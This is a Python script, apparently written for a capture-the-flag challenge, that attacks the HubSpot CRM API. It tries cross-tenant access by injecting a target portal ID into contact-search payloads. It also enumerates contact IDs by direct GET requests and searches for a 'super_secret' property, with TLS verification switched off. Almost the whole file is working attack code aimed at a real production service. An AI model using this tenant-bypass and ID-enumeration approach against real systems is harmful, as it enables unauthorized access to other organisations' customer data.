#!/usr/bin/env python3
"""
Targeted search with portal ID manipulation
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print("Targeted Search with Portal ID Manipulation")
print("="*80)

headers = {
    'Authorization': f'Bearer {ACCESS_TOKEN}',
    'Content-Type': 'application/json',
}

search_url = 'https://api.hubapi.com/crm/v3/objects/contacts/search'

# Try multiple search variations with target portal
searches = [
    # Variation 1: Portal in body
    {
        'portalId': TARGET_PORTAL,
        'filterGroups': [],
        'properties': ['firstname', 'super_secret', 'email', 'id'],
        'limit': 100
    },
    # Variation 2: Filter by portal
    {
        'filterGroups': [{
            'filters': [{
                'propertyName': 'hs_portal_id',
                'operator': 'EQ',
                'value': TARGET_PORTAL
            }]
        }],
        'properties': ['firstname', 'super_secret', 'email'],
        'limit': 100
    },
    # Variation 3: Search for contact ID 1
    {
        'filterGroups': [{
            'filters': [{
                'propertyName': 'hs_object_id',
                'operator': 'EQ',
                'value': '1'
            }]
        }],
        'properties': ['firstname', 'super_secret', 'email'],
        'limit': 10,
        'portalId': TARGET_PORTAL
    },
    # Variation 4: Search ALL contacts and look for super_secret != null
    {
        'filterGroups': [{
            'filters': [{
                'propertyName': 'super_secret',
                'operator': 'HAS_PROPERTY'
            }]
        }],
        'properties': ['firstname', 'super_secret', 'email', 'hs_object_id'],
        'limit': 100
    },
]

print(f"\n[*] Running {len(searches)} search variations...")

for i, payload in enumerate(searches, 1):
    print(f"\n{'='*80}")
    print(f"Search #{i}")
    print(f"{'='*80}")
    print(f"Payload: {json.dumps(payload, indent=2)[:300]}")

    try:
        r = requests.post(search_url, headers=headers, json=payload, verify=False, timeout=15)
        print(f"\nStatus: {r.status_code}")

        if r.status_code == 200:
            data = r.json()
            total = data.get('total', 0)
            results = data.get('results', [])

            print(f"Total: {total}")
            print(f"Results: {len(results)}")

            if results:
                print(f"\nFirst 5 results:")
                for j, result in enumerate(results[:5], 1):
                    props = result.get('properties', {})
                    contact_id = result.get('id')
                    url = result.get('url', '')

                    print(f"\n  Contact {j} (ID: {contact_id}):")
                    print(f"    URL: {url}")
                    print(f"    firstname: {props.get('firstname')}")
                    print(f"    super_secret: {props.get('super_secret')}")
                    print(f"    email: {props.get('email')}")

                    # Check if super_secret has a value
                    if props.get('super_secret') and props.get('super_secret') != 'null':
                        print(f"\n  ========================================")
                        print(f"  *** CTF FLAG FOUND! ***")
                        print(f"  ========================================")
                        print(f"  Contact ID: {contact_id}")
                        print(f"  Firstname: {props.get('firstname')}")
                        print(f"  Super Secret: {props.get('super_secret')}")
                        print(f"  ========================================")

                        with open('/home/user/Hub/findings/CTF_FLAG.json', 'w') as f:
                            json.dump({
                                'contact_id': contact_id,
                                'firstname': props.get('firstname'),
                                'super_secret': props.get('super_secret'),
                                'full_contact': result
                            }, f, indent=2)

                        print(f"\nSaved to: findings/CTF_FLAG.json")

            # Check which portal the results are from
            if results:
                first_url = results[0].get('url', '')
                if TARGET_PORTAL in first_url:
                    print(f"\n  *** Results are from TARGET PORTAL {TARGET_PORTAL}! ***")
                else:
                    print(f"\n  Results are from a different portal (check URL)")

        else:
            print(f"Error: {r.text[:300]}")

    except Exception as e:
        print(f"Error: {str(e)[:200]}")

# ============================================================================
# ALSO TRY DIRECT GET IF WE FIND CONTACT IDS
# ============================================================================

print(f"\n\n{'='*80}")
print("Trying direct contact access")
print(f"{'='*80}")

# Try to get contact 1 directly using the v3 API
for contact_id in [1, 2, 3, 5, 10, 100]:
    url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}?properties=firstname,super_secret,email'

    try:
        r = requests.get(url, headers=headers, verify=False, timeout=5)
        print(f"\nContact {contact_id}: {r.status_code}")

        if r.status_code == 200:
            data = r.json()
            props = data.get('properties', {})

            print(f"  firstname: {props.get('firstname')}")
            print(f"  super_secret: {props.get('super_secret')}")

            if props.get('super_secret'):
                print(f"\n  *** FOUND FLAG! ***")
                print(f"  super_secret: {props.get('super_secret')}")

    except:
        pass

print("\n" + "="*80)
print("Targeted Search Complete")
print("="*80)
